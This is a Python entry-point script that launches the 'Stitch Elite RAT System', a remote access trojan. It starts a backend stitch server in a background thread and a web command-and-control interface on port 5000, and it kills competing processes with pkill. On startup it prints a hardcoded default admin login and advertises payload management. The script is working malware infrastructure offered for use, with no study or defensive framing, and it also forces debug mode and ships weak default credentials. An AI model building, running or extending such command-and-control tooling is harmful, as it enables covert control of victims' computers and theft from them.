#!/usr/bin/env python3
"""
Stitch Elite RAT System - Main Entry Point for Replit
This is the main entry point that starts both the web interface and backend services
"""

import os
import sys
import time
import socket
import threading
import signal
import atexit
from pathlib import Path

# Set up environment variables for Replit
os.environ.setdefault('STITCH_DEBUG', 'true')
# Legacy admin credentials removed - using webhook-based authentication
os.environ.setdefault('STITCH_REDIS_URL', 'memory://')
os.environ.setdefault('FLASK_ENV', 'development')
os.environ.setdefault('FLASK_DEBUG', 'true')

# Add current directory to Python path
sys.path.insert(0, os.path.dirname(__file__))

def check_port_available(port):
    """Check if a port is available"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex(('127.0.0.1', port))
    sock.close()
    return result != 0

def kill_existing_processes():
    """Kill any existing processes that might be using our ports"""
    try:
        # Kill processes using port 5000
        os.system("pkill -f 'main_entry' 2>/dev/null || true")
        os.system("pkill -f 'stitch_server' 2>/dev/null || true")
        time.sleep(1)
    except:
        pass

def start_web_interface():
    """Start the web interface"""
    try:
        print("🌐 Starting Web Interface...")
        from main_entry import OranolioRATSystem
        
        # Start the complete system
        system = OranolioRATSystem()
        system.initialize()
        system.start()
    except Exception as e:
        print(f"❌ Error starting web interface: {e}")
        import traceback
        traceback.print_exc()

def start_backend_services():
    """Start backend services in background"""
    try:
        print("🔧 Starting Backend Services...")
        
        # Start stitch server in background
        def run_stitch_server():
            try:
                from Application.stitch_cmd import stitch_server
                stitch_server()
            except Exception as e:
                print(f"Backend service error: {e}")
        
        # Run in background thread
        backend_thread = threading.Thread(target=run_stitch_server, daemon=True)
        backend_thread.start()
        
    except Exception as e:
        print(f"❌ Error starting backend services: {e}")

def setup_signal_handlers():
    """Setup signal handlers for graceful shutdown"""
    def signal_handler(signum, frame):
        print("\n🛑 Shutting down gracefully...")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

def main():
    """Main entry point"""
    print("🚀 Stitch Elite RAT System - Starting...")
    print("=" * 60)
    
    # Setup signal handlers
    setup_signal_handlers()
    
    # Kill any existing processes
    kill_existing_processes()
    
    # Wait for ports to be available
    max_retries = 10
    for i in range(max_retries):
        if check_port_available(5000):
            break
        print(f"⏳ Waiting for port 5000 to be available... ({i+1}/{max_retries})")
        time.sleep(1)
    else:
        print("❌ Port 5000 is still in use after 10 seconds")
        sys.exit(1)
    
    # Start backend services
    start_backend_services()
    
    # Give backend time to start
    time.sleep(2)
    
    # Display startup information
    print("\n" + "=" * 60)
    print("🎯 SYSTEM READY")
    print("=" * 60)
    print("🌐 Web Interface: http://localhost:5000")
    print("👤 Default Admin: admin@oranolio.local")
    print("🔑 Default Password: admin123")
    print("⚠️  WARNING: Change default credentials immediately!")
    print("=" * 60)
    print("📊 Features Available:")
    print("   • Web-based Command & Control")
    print("   • Real-time Payload Management")
    print("   • Multi-Factor Authentication")
    print("   • Webhook Authentication System")
    print("   • Advanced Security Features")
    print("=" * 60)
    print("🛑 Press Ctrl+C to stop the system")
    print("=" * 60)
    
    # Start web interface (this blocks)
    start_web_interface()

if __name__ == "__main__":
    main()
